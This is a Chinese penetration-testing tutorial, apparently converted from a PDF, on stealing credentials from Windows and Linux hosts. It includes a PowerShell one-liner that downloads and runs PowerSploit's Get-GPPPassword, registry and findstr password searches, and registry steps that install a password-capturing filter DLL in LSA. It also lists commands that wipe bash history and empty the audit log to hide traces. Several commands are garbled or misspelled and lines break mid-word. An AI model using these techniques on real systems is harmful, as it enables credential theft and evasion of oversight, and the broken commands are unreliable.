####### 组策略首选项（GPP）文件
组策略首选项（GPP）是允许管理员使用嵌入式凭据创建域策略的工具。除此之外这些策略允许管理员设置本地账户。这些策略存储在域控制器上的SYSVOL
中，这就意味着任何域用户都可以查看SYSVOL
共享并解密密码。https://msrc-blog.microsoft.com/2014/05/13/ms14-025-an-update-for-
group-policy-preferences/ 通过以下工具和脚本来从组策略首选项XML
文件中获取：
> 1\. powershell \"IEX (New-Object
> Net.WebClient).DownloadString(\'https://raw.githubusercontent.com/PowerShell
>
> Mafia/PowerSploit/master/Exfiltration/Get-GPPPassword.ps1\');Get-
> GPPPassword\"
>
> ![](media/image266.jpeg){width="5.825069991251094in"
> height="1.7624989063867016in"}
>
> 或手动导入Get-GPPPassword.ps1
> https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/maste
> r/Exfiltration/Get-GPPPassword.ps1 PS\> Import-Moudle .\\Get-
> GPPassword.ps1 PS\> Get-GPPaswword
>
> ![](media/image267.jpeg){width="5.888467847769029in"
> height="1.7799989063867017in"}
####### 文件中的凭据
> 攻击者可以在本地文件系统和远程文件中共享中搜索包含密码的文件。这些文件可能是用户自己创建的文件来用于存储自己的凭据，或者是存储着系统或者服务密码的配置文件，或者是一个包含密码的二进制文件。
> 查找系统内所有含password 的文件： findstr /si password \*.txt findstr
> /si password \*.xml findstr /si password
\*.ini 从Windows 域控制器上的组策略首选项获取密码：
https://pentestlab.blog/2017/04/19/stored-credentials/
####### 注册表中的凭据
Windows
注册表存储了可供系统或者其它程序使用的配置信息。攻击者可以通过查询注册表来获取到已经储存以供程序和服务使用的凭据和密码。命令如下：
-   获取所有用户：reg query HKLM /f password /t REG_SZ /s
-   获取当前用户：reg query HKCU /f password /t REG_SZ /s
    1.  ####### 键盘记录
攻击者可以通过键盘记录来获取到用户有效的凭据。
####### Kerberos
当攻击者可以利用程序、服务、系统软件或者内核本身中的编程错误来控制代码
时，就会利用软件的漏洞，来利用身份验证和验证机制来进行攻击，作为获取有用凭据访问权限或绕过流程来获取系统访问权的手段。其中一个例子是MS14-
068，它以Kerberos 为目标，用域用户权限去伪造Kerberos
票据。https://adsecurity.org/?p=541 https://adsecurity.org/?p=525
https://adsecurity.org/?p=1515
####### Kerberoast
服务主体名称（SPN）是Kerberos 客户端唯一标识给定Kerberos
目标计算机的服务实例的名称。如果在整个林中的计算机上安装多个服务实例，则每个实例都必须具有自己的SPN。如果客户端可能使用多个名称进行身份验证，则给定的服务实例可以具有多个SPN。例如，SPN
始终包含运行服务实例的主机的名称，因此服务实例可以为其主机的每个名称或别名注册SPN。
以下是最受欢迎的AD Kerberos 攻击：
-   SPN 扫描：通过请求特定SPN 类/类型的服务主体名称来查找服务。
-   Silver Ticket：伪造Kerberos TGS 服务票
-   Golden Ticket：伪造Kerberos TGT 认证票
-   MS14-068 Forged PAC Exploit：利用域控制器上的Kerberos 漏洞。
-   钻石PAC - 混合攻击类型使用Golden Ticket 和MS14-068 伪造PAC 的元素。
-   Skeleton Key 内存中的恶意软件： 恶意软件"修补"域控制器内存中的LSASS
    身份验证过程，以启用第二个有效的"框架密钥"密码，可用于对任何域帐户进行身份验证。
参考：https://adsecurity.org/?p=2293 SPN 扫描 通过SPN
扫描可以清楚的看到各个服务：
https://github.com/PyroTek3/PowerShell-AD-Recon
![](media/image268.png){width="5.724082458442695in"
height="3.6693744531933508in"}
当攻击者拥有与服务账户相关联的SPN 列表，这些列表就可以用于请求对脱机TGS
密码破解有用的TGS 服务票据。
## 嗅探
网络嗅探是指通过使用系统上的网络接口来获取有线或者无线发送的信息。攻击者将网络接口置于混杂模式来通过网络被动的访问传输中的数据，或者跨接端口来获取数据。通过该技术攻击者可以包括用户的凭据，其中最容易获取的就是没有通过加密的通讯协议发送的凭据。也可以通过将流量定向到本地来获取信息。
可以通过Wireshark 来抓取到密码
![](media/image269.jpeg){width="4.82028980752406in" height="2.33in"}
还有很多通过流量抓取的方式
## 密码过滤
Windows
密码过滤器是域和本地账户密码策略来实施的机制。过滤器实现的方式为动态链接库（DLL），其中包含了根据密码策略验证潜在密码的方法。在发送密码更改的请求时，LSA
会调用系统上注册的密码筛选器。每个密码过滤器会调用两回，先验证新的密码然后在所有的过滤器验证完新密码后，再让过滤器进行修
改。如图：
![](media/image270.jpeg){width="5.85214457567804in"
height="2.9812489063867016in"}
可以总结为：
1.  将DLL 复制到域控制器或者本地计算机的Windows 按照目录。标准安装中，
    默认位置为Windows\\System32.
2.  更 新 注 册 表 ：
    HKEY_LOCAL_MACHINE/SYSTEM/CurrentControlSet/Control/Lsa/Notificatio
    n Packages
    1.  如果存在Notification Packages 子项，请将DLL
        的名称添加到现有值数据中。不要覆盖现有值，也不要包含.dll
        扩展名。
    2.  如果Notification Packages
        子项不存在，请添加它，然后为值数据指定DLL 的名称。不要包含.dll
        扩展名。
    3.  该通知程序包的子项可以添加多个软件包。
    -   将DLL 放进默认目录和更新注册表信息
> ![](media/image271.jpeg){width="5.869203849518811in"
> height="3.9541666666666666in"}
-   也可以通过命令行的方式实现：
1.  首 先 读 取 注 册 表 键 值 获 取 到 内 容 ： REG QUERY
    \"HKLM\\SYSTEM\\CurrentControlSet\\Control\\Lsa\" /v \"Notification
    Packages\"
> ![](media/image272.jpeg){width="5.863505030621172in"
> height="0.48583333333333334in"}
2.  添 加 Win32Project3 到 注 册 表 中 ： REG ADD
    \"HKLM\\SYSTEM\\CurrentControlSet\\Control\\Lsa\" /v \"Notification
    Packages\" /t REG_MULTI_SZ /d \"scecli\\0rassfm\\0Win32Project3\" /f
> ![](media/image273.jpeg){width="5.729694881889764in"
> height="0.3225in"}
3.  当用户重启系统修改密码后会在C:\\生成两个文件，里面记录着用户密码（包括未登录用户的）
> ![](media/image274.jpeg){width="5.856759623797025in"
> height="1.6666666666666667in"}
####### 必须要重启才能生效，所以对域控制服务器来说不太适合。
参 考 https://3gstudent.github.io/3gstudent.github.io/Password-Filter-
DLL%E5%9C%A8%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%
E4%B8%AD%E7%9A%84%E5%BA%94%E7%94%A8/
every-time-they.html
2.  ## Linux
    1.  ####### Bash History
> *Bashhistory*描述
Bash
使用"history"实用程序跟踪用户在命令行上键入的命令。用户注销后，会将历史记录刷新到用户的.bash_history
文件中。对于每个用户，此文件位于同一位置：\~/.bash_history。通常，此文件会跟踪用户的最近
500
个命令。用户通常在命令行上键入用户名和密码作为程序的参数，然后在注销时将其保存到此文件中。攻击者可以通过查看文件来查看潜在凭据来滥用此功能。
> 环境介绍
>
> 目标靶机：Centos
>
> ip 地址：192.168.18.138
>
> *Bash*历史记录
>
> history
>
> cat \~/.bash_history
>
> cat #{bash 历史命令文件} \| grep #{bash 历史命令关键词检索} \>
> #{重定向输出文件名}
##### 模拟攻击
> history
![](media/image275.jpeg){width="5.811905074365704in" height="3.8425in"}
> sudo cat \~/.bash_history \| grep password \> bash.txt
![](media/image276.jpeg){width="5.763755468066492in"
height="1.2943744531933508in"}
##### 攻击留痕
audit 日志
![](media/image277.jpeg){width="5.836040026246719in"
height="2.6945833333333336in"}
> time-\>Sat Aug 17 19:05:54 2019
>
> type=PROCTITLE msg=audit(1566039954.817:232):
> proctitle=636174002F726F6F74 2F2E626173685F686973746F7279
>
> type=PATH msg=audit(1566039954.817:232): item=0
> name=\"/root/.bash_history\" in ode=34163405 dev=fd:00 mode=0100600
> ouid=0 ogid=0 rdev=00:00 obj=unconfine d_u:object_r:admin_home_t:s0
> objtype=NORMAL cap_fp=0000000000000000 cap_f i=0000000000000000
> cap_fe=0 cap_fver=0
>
> type=CWD msg=audit(1566039954.817:232): cwd=\"/var/log/audit\"
>
> type=SYSCALL msg=audit(1566039954.817:232): arch=c000003e syscall=2
> success
>
> =yes exit=3 a0=7ffc6f482769 a1=0 a2=1fffffffffff0000 a3=7ffc6f481220
> items=1 ppi d=7370 pid=8300 auid=0 uid=0 gid=0 euid=0 suid=0 fsuid=0
> egid=0 sgid=0 fsgid=0 tty=pts0 ses=2 comm=\"cat\" exe=\"/usr/bin/cat\"
> subj=unconfined_u:unconfined_r:u nconfined_t:s0-s0:c0.c1023 key=(null)
>
> \# 这里只是提取了部分日志数据
历史记录
> root@localhost:\~# history
>
> 509 sudo cat \~/.bash_history \| grep password \> bash.txt
![](media/image278.jpeg){width="5.847849956255468in"
height="0.48562445319335085in"}
##### 防护
清除历史命令
1.  在命令前插入空格 export HISTCONTROL=ignorespace 执行命令时
    以空格开头，则不会记录到history
2.  禁用当前会话的所有历史记录 export HISTSIZE=0 history -cw 都会清空
> history
3.  只针对你的工作关闭历史记录 set +o history 执行命令 set -o history
4.  从历史记录中删除指定的命令 history -d \[num\]
5.  删除全部历史命令rm \~/.bash_history echo \" \" \> .bash_history
> cat /dev/null \> \~/.bash_history
>
> 1\. 清除记录历史文件位置的变量，这样就不会存储任何东西 unset HISTFILE
> 同样的，你可以使用向上的箭头一直往回翻看历史记录。当你发现你感兴趣的命令出现在终端上时，按下Ctrl +
> U 清除整行，也会从历史记录
清除 audit 日志
> cat /dev/null \> /var/log/audit/audit.log #清除日志文件
####### 密码转储
Linux 上的/proc
文件系统包含了有关正在运行的操作系统状态的大量信息。以root
权限运行的进程可以使用次工具来获取其它正在运行的程序和实时内存。可以通过MimiPenguin
来获取 https://linux.cn/article-8581-1.html
> *mimipenguin mimipenguin*描述
>
> mimipenguin 是一个免费、开源、简单但是强大的 shell/python 脚本，用来从
当前 Linux
桌面用户转储登录凭证（用户名和密码）的一款工具，适合不同的Linux
发行版本，基于流行的Windows 工具mimikatz。
###### mimipenguin细节
当用户名和密码是由进程（运行中的程序）保存在内存中，并以明文形式存储较长时间。mimipenguin
在技术上利用这些在内存中的明文凭证 -
它会转储一个进程，并提取可能包含明文凭据的行。
然后，通过以下内容的哈希值来尝试计算每个单词的出现几率：/etc/shadow、内存和
regex
搜索。一旦找到任何内容，它就会在标准输出上打印出来。(使用内存中已知结构的硬编码偏移量以及PTRACE
可靠地从Linux 桌面环境中提取明文用户密码。)
##### 环境介绍
> 目标靶机：Ubuntu 18.04.2 LTS
>
> gnome-keyring: 3.28.0.2
##### 具备条件
> \# root 权限
目前支持的目标
OS 服务 支持的
Ubuntu Desktop 12.04 LTS x64 gnome-keyring-daemon ✔
> （3.18.3）